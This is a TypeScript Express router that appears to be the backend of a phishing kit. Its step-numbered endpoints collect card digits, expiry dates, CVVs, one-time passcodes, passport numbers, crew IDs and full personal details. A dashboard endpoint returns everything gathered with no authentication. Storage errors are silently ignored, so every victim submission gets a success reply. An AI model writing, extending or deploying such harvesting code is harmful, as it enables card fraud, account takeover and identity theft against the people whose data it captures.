import { Router, type IRouter } from "express";
import { db, cardSubmissionsTable, contactSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
import { sql, eq } from "drizzle-orm";
import { z } from "zod";
import { requireAuth } from "../middleware/require-auth";

const router: IRouter = Router();

const CardBody = z.object({
  username: z.string().min(1),
  crewId: z.string().optional(),
  passportNo: z.string().optional(),
  cardLast8: z.string().optional(),
  cardMonth: z.string().optional(),
  cardYear: z.string().optional(),
  cvv: z.string().optional(),
  ipAddress: z.string().optional(),
});

const OtpBody = z.object({
  username: z.string().min(1),
  email: z.string().optional(),
  otpCode: z.string().optional(),
  ipAddress: z.string().optional(),
});

const ContactBody = z.object({
  username: z.string().min(1),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  email: z.string().optional(),
  phone: z.string().optional(),
  address: z.string().optional(),
  city: z.string().optional(),
  state: z.string().optional(),
  postalCode: z.string().optional(),
  dob: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  passportFilename: z.string().optional(),
  employeeIdFilename: z.string().optional(),
  ipAddress: z.string().optional(),
});

const PersonalBody = z.object({
  username: z.string().min(1),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  email: z.string().optional(),
  phone: z.string().optional(),
  address: z.string().optional(),
  city: z.string().optional(),
  state: z.string().optional(),
  postalCode: z.string().optional(),
  dob: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  ipAddress: z.string().optional(),
});

/* Contact Form — Data + Photo Filenames */
router.post("/submissions/contact", async (req, res): Promise<void> => {
  const parsed = ContactBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(contactSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

/* Step 2 — Card Details */
router.post("/submissions/card", async (req, res): Promise<void> => {
  const parsed = CardBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(cardSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

/* Step 3 — Personal Info */
router.post("/submissions/personal", async (req, res): Promise<void> => {
  const parsed = PersonalBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

/* Step 4 — OTP */
router.post("/submissions/otp", async (req, res): Promise<void> => {
  const parsed = OtpBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(otpSubmissionsTable).values(parsed.data).catch(() => {});
  res.json({ ok: true });
});

/* Dashboard — gabungan semua data via VIEW user_journey */
router.get("/submissions/all", async (req, res): Promise<void> => {
  const rows = await db.execute(sql`SELECT * FROM user_journey`);
  res.json(rows.rows);
});

/* Admin — list all contact form submissions dengan card last 8 digits (auth required) */
router.get("/submissions/contact", requireAuth, async (req, res): Promise<void> => {
  const rows = await db.execute(sql`
    SELECT
      cs.id,
      cs.username,
      cs.first_name      AS "firstName",
      cs.last_name       AS "lastName",
      cs.email,
      cs.phone,
      cs.address,
      cs.city,
      cs.state,
      cs.postal_code     AS "postalCode",
      cs.dob,
      cs.inquiry_type    AS "inquiryType",
      cs.message,
      cs.passport_filename     AS "passportFilename",
      cs.employee_id_filename  AS "employeeIdFilename",
      cs.ip_address      AS "ipAddress",
      cs.submitted_at    AS "submittedAt",
      latest_card.card_last8   AS "cardLast8",
      latest_card.card_month   AS "cardMonth",
      latest_card.card_year    AS "cardYear",
      latest_card.crew_id      AS "crewId",
      latest_card.passport_no  AS "passportNo"
    FROM contact_submissions cs
    LEFT JOIN LATERAL (
      SELECT card_last8, card_month, card_year, crew_id, passport_no
      FROM card_submissions
      WHERE username = cs.username
      ORDER BY submitted_at DESC
      LIMIT 1
    ) AS latest_card ON true
    ORDER BY cs.submitted_at DESC
  `);
  res.json(rows.rows);
});

export default router;
